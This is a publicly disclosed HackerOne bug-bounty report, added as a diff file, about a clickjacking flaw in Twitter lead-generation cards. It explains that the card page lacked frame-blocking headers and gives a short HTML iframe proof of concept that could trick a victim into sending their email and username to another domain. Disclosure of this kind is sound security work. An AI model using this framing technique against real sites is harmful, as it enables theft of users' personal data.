@@ -1,0 +1,31 @@
+ReportLink:https://hackerone.com/reports/154963
+WeaknessName:UI Redressing (Clickjacking)
+Reporter:https://hackerone.com/akhil-reni
+ReportedTo:Twitter(twitter)
+BountyAmount:1120.0
+Severity:medium
+State:Closed
+DateOfDisclosure:03.02.2017 16:14:43
+
+Summary:
+
+**Hello**
+
+In twitter you can create cards to generate leads.
+For example:
+https://twitter.com/i/cards/tfw/v1/759046372544741376?cardname=promotion&autoplay_disabled=true&earned=true&lang=en&card_height=357
+
+If you visit the above URL and click the button your email and username is sent to my domain.
+
+Since this page is missing X-FRAME-HEADERS,
+a user could simply iframe the URL and could steal victim's emails.
+
+**Proof of concept code**
+```
+<html>
+<iframe src=https://twitter.com/i/cards/tfw/v1/759046372544741376?cardname=promotion&autoplay_disabled=true&earned=true&lang=en&card_height=357>
+</html>
+```
+
+**Regards,
+Akhil**
